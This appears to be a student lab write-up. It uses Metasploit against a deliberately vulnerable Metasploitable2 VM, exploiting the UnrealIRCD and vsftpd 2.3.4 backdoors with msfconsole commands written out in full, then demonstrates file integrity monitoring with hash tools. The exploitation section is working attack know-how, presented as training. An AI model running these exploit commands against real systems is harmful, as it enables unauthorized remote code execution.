Metasploit Framework & Host Hardening Lab

Project Overview

In this comprehensive penetration testing project, I demonstrated proficiency with the Metasploit Framework (MSF)—a professional-grade exploitation platform used by security teams worldwide. The objective was to understand practical attack methodologies against vulnerable systems and then apply defensive hardening techniques to detect and prevent intrusions.

The Metasploit Framework is an extensible platform that consolidates proven exploits, payloads, and support infrastructure. Rather than building custom exploits from scratch, MSF allows penetration testers to focus on reconnaissance, targeting, and analysis. I utilized two Linux virtual machines for this exercise: Kali Linux (equipped with Metasploit) as the attacking platform, and Metasploitable2 as the intentionally vulnerable target system.

Phase 2: Exploitation Using Metasploit Console

UnrealIRCD Backdoor Exploitation

I identified that Metasploitable2 runs UnrealIRCD (Internet Relay Chat daemon) on port 6667. This version contains a known backdoor vulnerability that can be triggered by sending specific command sequences. Metasploit includes a dedicated exploitation module for this flaw.

I executed the following commands in msfconsole:

msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf exploit(unreal_ircd_3281_backdoor) > set RHOST 10.0.2.15
msf exploit(unreal_ircd_3281_backdoor) > exploit

Successful exploitation resulted in direct shell access:

Successful UnrealIRCD exploitation with active shell session

From the remote shell, I verified my access level and system information:

$ whoami
$ uname -a

The output confirmed I had gained unprivileged shell access to the target machine from my attacking platform.

Vsftpd v2.3.4 Backdoor Exploitation

Next, I exploited a second vulnerability in the very-secure FTP daemon (vsftpd). This version contains a backdoor that was inadvertently introduced into the official source distribution between June 30-July 1, 2011. Metasploit includes a module designed specifically for this vulnerability.

I executed:

$ msfconsole
msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(vsftpd_234_backdoor) > set RHOST 172.16.108.172
msf exploit(vsftpd_234_backdoor) > set payload cmd/unix/interact
msf exploit(vsftpd_234_backdoor) > exploit

Verification commands in the resulting shell:

$ whoami
$ uname -a

Vsftpd backdoor exploitation with command execution

Both attacks successfully demonstrated remote code execution—I could execute arbitrary system commands on the vulnerable target from my attacking machine.

Phase 4: Host Integrity Verification

File Integrity Monitoring

After demonstrating offensive techniques, I implemented a defensive security control: file integrity monitoring. This process creates cryptographic hashes of system files and regularly verifies them to detect unauthorized modifications—a critical technique for detecting post-exploitation persistence mechanisms.

I initially attempted FileVerifier++, but encountered compatibility issues with modern Windows operating systems (this tool is no longer actively maintained). I pivoted to HashMyFile, a more current alternative that provides equivalent functionality.

FileVerifier++ interface showing files added from Downloads directory with CRC16 hashes computed

FileVerifier++ verification results confirming all files passed integrity check

Initial Integrity Baseline

I generated a baseline hash of my Downloads directory and all contained files:

Detection of File Changes

I then added a new file (Laxman_Puri.txt) to the Downloads directory and regenerated the hashes:

HashMyFiles showing new file (Laxman_Puri.txt) added to Downloads directory with its MD5 hash

The hash value changed significantly, demonstrating that file integrity verification would successfully detect unauthorized file modifications or additions. This is a practical technique used by system administrators to detect compromised systems following an intrusion.

Key Takeaways

  1. Metasploit as an Enabler: The Metasploit Framework dramatically accelerates the penetration testing process by consolidating exploit development, payload delivery, and post-exploitation features into a unified platform.

  2. Multiple Attack Vectors: A single target system often contains multiple exploitable vulnerabilities. Successful penetration testers must identify and chain together various attack vectors.

  3. Dual Interface Paradigm: Both command-line (msfconsole) and graphical (Armitage) interfaces serve different user preferences while maintaining equivalent functionality. In professional environments, command-line tools often provide superior flexibility and scriptability.

  4. Defense Detection: File integrity monitoring represents a fundamental defensive layer that catches post-exploitation artifacts. By regularly verifying cryptographic hashes of critical files, defenders can identify when systems have been compromised.

  5. Verification and Proof: Each successful exploitation must be verified with concrete evidence—executing commands that prove code execution, creating unique files, or capturing system information uniquely attributable to the target system.
